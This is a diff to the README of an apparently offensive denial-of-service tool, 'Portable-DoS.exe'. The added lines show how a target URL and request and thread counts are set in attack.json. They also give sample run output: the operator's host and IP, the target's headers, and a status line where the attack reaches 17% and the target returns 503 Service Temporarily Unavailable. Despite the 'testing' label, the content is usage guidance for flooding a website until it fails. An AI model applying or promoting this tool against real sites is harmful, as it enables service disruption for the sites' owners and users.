@@ -22,7 +22,36 @@ Define target website for testing and number of requests and threads in [Attack.
   "threads": 1000
 }
 ```
-Start DoS attack testing using *Portable-DoS.exe*.
+Start DoS attack testing using *Portable-DoS.exe*
+```
+Configuration file: attack.json
+Target url: https://target-adress.com/
+Serial requests: 100
+Parallel threads: 1000
+
+User: DESKTOP-AZF7BU9
+IPv4: 148.77.34.195
+Country: United States of America
+
+Checking target https://target-adress.com/...
+StatusCode: 200, ReasonPhrase: 'OK', Version: 1.1, Content: System.Net.Http.HttpConnectionResponseContent, 
+Headers:
+{
+  Server: nginx-reuseport/1.13.4
+  Date: Sat, 18 Jan 2021 23:59:00 GMT
+  Connection: keep-alive
+  Keep-Alive: timeout=30
+  Vary: Accept-Encoding
+  Vary: Accept-Encoding
+  Cache-Control: public, max-age=0
+  X-Powered-By: WP Rocket/3.7.4
+  Accept-Ranges: bytes
+  Content-Type: text/html; charset=UTF-8
+  Content-Length: 761612
+  Expires: Sat, 18 Jan 2021 23:59:00 GMT
+}
+```
+The application shows the current attack status and target status.
 ```
 [ Serial requests: 100 ][ Parallel threads: 1000 ]
 [ Attack: 17% ][ Target:  503 (Service Temporarily Unavailable). ] 
